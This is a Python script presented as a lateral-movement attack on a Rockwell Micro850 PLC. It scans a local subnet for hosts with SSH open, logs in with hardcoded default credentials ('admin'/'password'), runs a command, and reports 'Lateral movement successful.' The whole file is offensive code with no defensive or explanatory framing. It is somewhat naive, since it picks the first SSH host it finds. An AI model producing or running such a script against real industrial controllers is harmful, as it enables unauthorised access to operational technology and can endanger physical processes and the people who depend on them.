import paramiko
import socket
import re

# Default credentials for the Rockwell Micro850 PLC
DEFAULT_USERNAME = "admin"
DEFAULT_PASSWORD = "password"

# Function to find the PLC's IP address
def find_plc_ip():
    # Example: Scanning the network for the PLC by checking common IP ranges
    # This is a simplified example and should be adapted to your network configuration
    ip_range = "192.168.1."
    for i in range(1, 255):
        ip = ip_range + str(i)
        try:
            socket.create_connection((ip, 22), timeout=1)
            print(f"Found potential PLC at {ip}")
            return ip
        except (socket.timeout, ConnectionRefusedError):
            continue
    print("PLC not found on the network.")
    return None

# Function to attempt SSH login with default credentials
def attempt_ssh_login(ip):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, username=DEFAULT_USERNAME, password=DEFAULT_PASSWORD)
        print(f"Successfully logged into {ip} with default credentials.")
        # Execute commands or scripts here
        stdin, stdout, stderr = ssh.exec_command("ls")
        print(stdout.read().decode())
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        print(f"Failed to log into {ip} with default credentials.")
        return False
    except Exception as e:
        print(f"Error connecting to {ip}: {e}")
        return False

# Main function
def main():
    plc_ip = find_plc_ip()
    if plc_ip:
        if attempt_ssh_login(plc_ip):
            print("Lateral movement successful.")
        else:
            print("Lateral movement failed.")

if __name__ == "__main__":
    main()